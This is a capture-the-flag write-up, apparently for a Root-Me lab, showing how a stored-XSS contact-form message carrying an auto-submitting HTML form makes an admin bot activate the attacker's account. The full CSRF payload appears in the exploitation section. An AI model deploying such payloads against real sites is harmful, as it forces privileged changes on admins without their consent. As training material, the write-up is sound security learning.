#### Challenge Name
CSRF - 0 protection

#### Vulnerability Type
Cross site request forgery + XSS
The application is vulnerable to stored XSS in the contact form, allowing execution of attacker-controlled
scripts in the admin’s context, which is then used to perform a CSRF attack.

#### Goal
Activate your account to access intranet.

#### Initial Observation
- I registered with the credentials: `username: wiener`, `password: peter`.
- Then I logged into the website.
- There are four endpoints: /contact, /profile, /private, /logout.
- 
- First, I visited /profile:
	- Two fields: username and status (checkbox)
	- Status was disabled
	- I tried to update the profile; it showed: `You are not an admin`
  - <img width="600" height="365" alt="image" src="https://github.com/user-attachments/assets/2104b23d-5ded-4d80-bd23-aaf813f2f246" />
- Next, I visited /contact:
	- Two fields: email and message
	- I was able to submit the message without the email.
	- After submitting the message, it showed: `Your message has been posted. The administrator will contact you later.`
- Next, I visited /private:
	- It showed: `Your account has not been validated by an administrator, please wait.`

#### Exploitation
- I understood that to activate my account, the admin must set the status as checked.
- For normal users, the checkbox was disabled.
- The sink was the message field in the contact page, which is reviewed by the admin bot.
- I created a malicious payload. When the admin bot visits the page, the update request is automatically submitted without the admin's consent.
- Payload:
```
<form name="csrf" 
action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" 
enctype="multipart/form-data"> 
<input type="text" name="username" value="test" /> 
<input type="checkbox" name="status" checked=checked /> 
<input type="submit" value="Submit request" /> 
</form> 
<script>document.csrf.submit()</script>
```
#### What I learned
- Stored XSS happens when input is not filtered and runs as code
- Input should be sanitized to stop malicious scripts
- CSRF token checks if the request is valid
